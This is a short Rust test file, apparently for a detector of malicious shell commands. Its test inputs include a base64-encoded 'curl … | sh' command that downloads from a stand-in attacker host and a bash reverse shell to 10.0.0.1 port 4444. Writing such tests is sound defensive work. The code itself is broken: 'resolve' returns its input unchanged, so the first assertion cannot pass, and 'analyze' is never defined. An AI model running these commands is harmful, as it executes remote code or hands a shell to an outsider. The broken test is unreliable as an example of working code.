fn resolve(input: &str) -> String { input.to_owned() }
#[test]
fn resolves_encoded_shell() {
    let out = resolve("echo Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9wIHwgc2g= | base64 -d | sh");
    assert!(out.contains("curl https://evil.example/p | sh"));
}
#[test]
fn analyze_shell() {
    let findings = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
    assert!(!findings.is_empty());
}
